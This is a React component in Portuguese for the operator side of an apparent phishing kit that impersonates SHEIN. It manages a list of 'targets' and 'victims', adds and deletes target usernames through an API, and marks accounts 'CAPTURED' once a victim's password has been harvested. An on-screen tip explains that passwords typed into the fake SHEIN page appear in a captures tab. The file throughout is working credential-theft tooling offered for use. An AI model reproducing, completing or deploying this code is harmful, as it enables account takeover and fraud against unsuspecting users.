import React, { useState, useEffect } from "react";
import { User } from "../types";
import { Database, Plus, Trash2, KeyRound, User as UserIcon, RefreshCw, Layers, CheckCircle } from "lucide-react";

interface LocalDbManagerProps {
  onSelectUser: (user: User) => void;
  triggerRefreshToggle: boolean;
  adminUsername: string;
}

export default function LocalDbManager({ onSelectUser, triggerRefreshToggle, adminUsername }: LocalDbManagerProps) {
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  
  // States for adding a new user for local tests
  const [newUsername, setNewUsername] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [newName, setNewName] = useState("");
  const [newRole, setNewRole] = useState("Cliente VIP");
  const [successAdd, setSuccessAdd] = useState<string | null>(null);

  // Fetch users from server db, filtered by current admin
  const fetchUsers = async () => {
    setLoading(true);
    setError(null);
    try {
      const res = await fetch(`/api/users?createdBy=${encodeURIComponent(adminUsername)}`);
      const data = await res.json();
      if (data.success) {
        setUsers(data.users);
      } else {
        setError("Não foi possível carregar a base de dados JSON.");
      }
    } catch (err) {
      setError("Erro de rede ao buscar banco de dados.");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (adminUsername) {
      fetchUsers();
    }
  }, [triggerRefreshToggle, adminUsername]);

  // Handle user creation
  const handleCreateUser = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newUsername) {
      setError("Preencha o nome do usuário!");
      return;
    }

    try {
      setError(null);
      setSuccessAdd(null);
      const res = await fetch("/api/users", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: newUsername,
          password: "",
          name: "Alvo Monitorado",
          role: "Cliente VIP",
          createdBy: adminUsername
        })
      });
      const data = await res.json();
      if (data.success) {
        setSuccessAdd(data.message);
        setNewUsername("");
        setNewPassword("");
        setNewName("");
        setNewRole("Cliente VIP");
        fetchUsers();
        setTimeout(() => setSuccessAdd(null), 4000);
      } else {
        setError(data.message || "Erro ao adicionar usuário.");
      }
    } catch (err) {
      setError("Erro de conexão ao salvar no arquivo users.json.");
    }
  };

  // Handle user deletion
  const handleDeleteUser = async (username: string) => {
    if (confirm(`Tem certeza que deseja apagar ${username} da sua lista de monitoramento?`)) {
      try {
        setError(null);
        const res = await fetch(`/api/users/${encodeURIComponent(username)}`, {
          method: "DELETE"
        });
        const data = await res.json();
        if (data.success) {
          fetchUsers();
        } else {
          setError(data.message || "Erro ao deletar.");
        }
      } catch (err) {
        setError("Erro ao se conectar para deletar usuário.");
      }
    }
  };

  return (
    <div id="db-manager-container" className="bg-white border border-stone-200 rounded-none p-5 text-stone-800 h-full flex flex-col justify-between font-mono shadow-sm">
      <div>
        {/* Header Title */}
        <div className="flex items-center justify-between border-b border-stone-200 pb-4 mb-4">
          <div className="flex items-center gap-3">
            <span className="p-2 bg-stone-100 text-black rounded-none border border-stone-200">
              <Database className="w-4 h-4 text-black animate-pulse" />
            </span>
            <div>
              <h2 className="text-xs font-bold text-black uppercase tracking-[0.12em]">Alvos de Captura</h2>
              <p className="text-[9px] text-stone-500 uppercase tracking-widest mt-0.5">Vítimas Vinculadas</p>
            </div>
          </div>
          <button 
            type="button" 
            onClick={fetchUsers} 
            className="px-3.5 py-1.5 bg-stone-100 hover:bg-black hover:text-white text-stone-800 border border-stone-200 rounded-none transition-all duration-200 flex items-center gap-1.5 text-[9px] font-bold uppercase tracking-widest cursor-pointer"
            title="Sincronizar Banco de Dados"
          >
            <RefreshCw className={`w-3 h-3 ${loading ? "animate-spin text-black" : ""}`} />
            <span>Sync</span>
          </button>
        </div>

        {/* Informative Label */}
        <div className="bg-stone-50 border border-stone-200/60 rounded-none p-3 text-[10px] mb-4 text-stone-600 leading-relaxed italic">
          💡 Contas cadastradas aqui serão exibidas na tela principal. Quando a vítima digitar as credenciais na SHEIN, você verá a senha na aba de Capturas.
        </div>

        {/* Display Active JSON DB */}
        <div className="space-y-2 max-h-[170px] overflow-y-auto mb-4 pr-1.5 custom-scrollbar">
          {loading && users.length === 0 ? (
            <div className="text-center py-6 text-stone-400 text-[10px] tracking-wider uppercase animate-pulse-soft">Carregando banco de alvos...</div>
          ) : users.length === 0 ? (
            <div className="text-center py-6 text-stone-400 text-[10px] bg-stone-50 rounded-none border border-stone-150 uppercase tracking-wider">
              Nenhum alvo cadastrado por você.
            </div>
          ) : (
            users.map((u) => (
              <div 
                key={u.username}
                onClick={() => onSelectUser(u)}
                className="group flex items-center justify-between p-3 bg-stone-50 hover:bg-stone-100/60 border border-stone-200 rounded-none cursor-pointer transition-all duration-150"
              >
                <div className="flex-1 min-w-0 pr-2">
                  <div className="flex items-center gap-1.5">
                    <span className="font-bold text-black text-xs truncate">{u.username}</span>
                    {u.password && (
                      <span className="text-[9px] text-[#8b1e1a] font-bold border border-red-300 px-1 bg-red-50">CAPTURED</span>
                    )}
                  </div>
                  <div className="flex items-center gap-1.5 mt-1 text-[10px] text-stone-500 font-serif">
                    <span className="truncate max-w-[90px]">{u.name}</span>
                    <span className="text-stone-300">•</span>
                    <span className="bg-stone-200 text-stone-700 px-1.5 py-[1px] rounded-none text-[8px] uppercase tracking-widest font-mono font-medium border border-stone-300">{u.role}</span>
                  </div>
                </div>
                <div className="flex items-center gap-1.5 opacity-85 group-hover:opacity-100 transition-opacity">
                  <span className="text-[8px] bg-white hover:bg-black hover:text-white text-stone-700 border border-stone-300 px-2 py-1 font-bold uppercase tracking-widest transition-colors">
                    Preencher
                  </span>
                  
                  <button
                    type="button"
                    onClick={(e) => {
                      e.stopPropagation();
                      handleDeleteUser(u.username);
                    }}
                    className="p-1 hover:bg-[#8b1e1a] hover:text-white text-stone-400 rounded-none transition-colors border border-transparent"
                    title="Remover Alvo"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                  </button>
                </div>
              </div>
            ))
          )}
        </div>
      </div>

      {/* Add New User Section */}
      <div className="border-t border-stone-200 pt-4 mt-auto">
        <h3 className="text-[10px] font-bold uppercase tracking-widest text-black mb-3 flex items-center gap-1.5">
          <Plus className="w-4 h-4 text-black" />
          <span>Cadastrar Novo Alvo</span>
        </h3>

        <form onSubmit={handleCreateUser} className="space-y-3">
          <div>
            <label className="block text-[8px] text-stone-500 mb-1 font-bold uppercase tracking-widest">Nome do Usuário</label>
            <div className="relative">
              <span className="absolute left-3 top-1/2 -translate-y-1/2 text-stone-500 font-bold text-[11px]">@</span>
              <input 
                type="text" 
                value={newUsername.replace(/^@/, "")}
                onChange={(e) => setNewUsername(e.target.value)}
                placeholder="usuario_alvo" 
                required
                className="w-full pl-6 pr-2.5 py-2.5 bg-stone-50 border border-stone-200 rounded-none text-xs text-stone-850 font-mono focus:outline-none focus:border-black transition-all"
              />
            </div>
          </div>

          {error && (
            <p className="text-[9px] text-red-500 uppercase font-semibold bg-red-50 p-2.5 border border-red-200">
              ❌ {error}
            </p>
          )}

          {successAdd && (
            <p className="text-[9px] text-emerald-600 uppercase font-semibold bg-emerald-50 p-2.5 border border-emerald-200 flex items-center gap-1.5 animate-scale-up">
              <CheckCircle className="w-3 h-3 flex-shrink-0 text-emerald-500" />
              <span>Cadastrado com sucesso!</span>
            </p>
          )}

          <button
            type="submit"
            className="w-full py-2.5 bg-black hover:bg-stone-800 text-white text-[10px] font-bold uppercase tracking-widest rounded-none shadow-sm transition-all duration-200 cursor-pointer border-none"
          >
            <Plus className="w-4 h-4 inline mr-1 text-white" />
            <span>Cadastrar Alvo</span>
          </button>
        </form>
      </div>
    </div>
  );
}
